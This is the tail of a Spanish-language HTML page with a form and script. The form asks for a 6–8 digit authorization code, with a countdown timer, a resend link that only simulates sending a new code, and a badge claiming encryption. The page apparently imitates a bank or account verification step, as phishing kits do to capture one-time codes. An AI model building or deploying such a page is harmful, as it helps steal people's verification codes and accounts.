          <svg class="security-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
          </svg>
          <span>Tus datos están protegidos con encriptación de alta seguridad</span>
        </div>
      </form>
    </div>
  </div>
  
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const modal = document.getElementById('welcomeModal');
      modal.classList.add('active');
      const timer = setTimeout(() => modal.classList.remove('active'), 6000);

      document.querySelector('.modal-close').addEventListener('click', () => {
        clearTimeout(timer);
        modal.classList.remove('active');
      });

      modal.addEventListener('click', (e) => {
        if (e.target === modal) {
          clearTimeout(timer);
          modal.classList.remove('active');
        }
      });
      
      // Foco automático en el campo de código
      document.getElementById('codigo_autorizacion').focus();
      
      // Iniciar contador regresivo
      startCountdown();
    });

    function startCountdown() {
      let timeLeft = 60; // 1 minuto = 60 segundos
      const countdownElement = document.getElementById('countdown-timer');
      const resendContainer = document.getElementById('resend-container');
      const timerMessage = document.querySelector('.timer-container p');
      
      const timerId = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
          clearInterval(timerId);
          // Ocultar contador y mostrar opción de reenvío
          countdownElement.style.display = 'none';
          timerMessage.textContent = 'El tiempo de espera ha finalizado.';
          resendContainer.style.display = 'block';
        }
      }, 1000);
      
      // Guardar el ID del temporizador para poder limpiarlo si es necesario
      countdownElement.dataset.timerId = timerId;
    }

    function resetCountdown() {
      const countdownElement = document.getElementById('countdown-timer');
      const resendContainer = document.getElementById('resend-container');
      const timerMessage = document.querySelector('.timer-container p');
      
      // Limpiar temporizador anterior si existe
      if (countdownElement.dataset.timerId) {
        clearInterval(countdownElement.dataset.timerId);
      }
      
      // Restaurar elementos
      countdownElement.style.display = 'block';
      countdownElement.textContent = '01:00';
      timerMessage.textContent = 'Por favor, espere. El código podría tardar unos momentos en llegar.';
      resendContainer.style.display = 'none';
      
      // Reiniciar contador
      startCountdown();
    }

    // Función para mostrar el modal de reenvío
    function showResendModal() {
      const modal = document.getElementById('resendModal');
      modal.classList.add('active');
      
      // Cerrar automáticamente después de 4 segundos
      setTimeout(() => {
        modal.classList.remove('active');
      }, 4000);
    }
    
    // Función para cerrar manualmente el modal de reenvío
    function closeResendModal() {
      document.getElementById('resendModal').classList.remove('active');
    }

    // Manejador para el botón de reenvío
    document.getElementById('resend-link').addEventListener('click', function(e) {
      e.preventDefault();
      resetCountdown();
      
      // Simular envío de nuevo código
      mostrarSpinner();
      setTimeout(() => {
        ocultarSpinner();
        // Mostrar modal en lugar de alert
        showResendModal();
      }, 1500);
    });

    function validateCode() {
      const codeInput = document.getElementById('codigo_autorizacion');
      const code = codeInput.value;
      
      // Validar que el código tenga entre 6 y 8 dígitos
      if (code.length < 6 || code.length > 8 || isNaN(code)) {
        alert('Por favor ingrese un código válido');
        codeInput.focus();
        return false;
      }
      
      mostrarSpinner();
      return true;
    }

    function mostrarSpinner() {
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('loading-text').style.display = 'block';
      const submitButton = document.getElementById('submitButton');
      submitButton.disabled = true;
      submitButton.textContent = 'Validando...';
    }
    
    function ocultarSpinner() {
      document.getElementById('spinner').style.display = 'none';
      document.getElementById('loading-text').style.display = 'none';
      const submitButton = document.getElementById('submitButton');
      submitButton.disabled = false;
      submitButton.textContent = 'Validar Código';
    }
  </script>
</body>
</html>